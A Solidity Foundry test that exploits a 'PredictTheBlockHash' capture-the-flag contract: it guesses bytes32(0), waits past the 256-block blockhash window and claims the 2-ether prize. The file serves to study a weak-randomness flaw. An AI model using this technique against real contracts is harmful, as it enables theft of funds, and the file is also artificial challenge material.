
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PredictTheBlockHashChallenge} from "../src/PredictTheBlockHashChallenge.sol";

contract TestWeakRandomnessPredictTheBlockHashChallenge is Test {

    PredictTheBlockHashChallenge public _contractUnderTest;

    function setUp() public {
        vm.deal(address(this), 10 ether);
        _contractUnderTest = new PredictTheBlockHashChallenge{value: 1 ether}();
    }

    function test_highlightPredictableRandomValue(uint256 blockNumber) public {
        
        // --- 1. Constraints ---
        vm.assume(blockNumber >= 1);
        vm.assume(blockNumber < type(uint256).max - 300);

        // --- 2. State Configuration ---
        vm.deal(address(this), 10 ether);
        
        // Set initial block number
        vm.roll(blockNumber);

        // --- 3. Exploit the blockhash limitation ---
        // The EVM only stores the last 256 block hashes.
        // For blocks older than 256 blocks, blockhash() returns bytes32(0).
        // We can exploit this by:
        // 1. Locking in a guess of bytes32(0)
        // 2. Waiting more than 256 blocks
        // 3. Calling settle() - the blockhash will be 0, matching our guess

        // Lock in a guess of bytes32(0)
        bytes32 predictedHash = bytes32(0);
        _contractUnderTest.lockInGuess{value: 1 ether}(predictedHash);
        
        // The guess is locked for block.number + 1
        uint256 guessBlock = blockNumber + 1;
        
        // Roll forward more than 256 blocks so blockhash returns 0
        vm.roll(guessBlock + 257);
        
        // --- 4. Replication & Assertion ---
        
        // Replicate the vulnerable logic: blockhash for blocks older than 256 returns 0
        bytes32 expectedAnswer = blockhash(guessBlock);
        
        // Verify our prediction is correct - blockhash should return 0
        assertEq(expectedAnswer, bytes32(0), "Blockhash should be 0 for old blocks");
        assertEq(expectedAnswer, predictedHash, "Our prediction should match the blockhash");
        
        // Record balance before settle
        uint256 balanceBefore = address(this).balance;
        uint256 contractBalanceBefore = address(_contractUnderTest).balance;
        
        // Execute settle - should win because our guess (0) matches blockhash (0)
        _contractUnderTest.settle();
        
        // Assert we received the prize (2 ether)
        uint256 balanceAfter = address(this).balance;
        assertEq(balanceAfter - balanceBefore, 2 ether, "Should have won 2 ether by predicting blockhash");
        
        // Assert contract balance decreased
        uint256 contractBalanceAfter = address(_contractUnderTest).balance;
        assertEq(contractBalanceBefore - contractBalanceAfter, 2 ether, "Contract should have paid out 2 ether");
    }

    // Required to receive ether from the contract
    receive() external payable {}
}
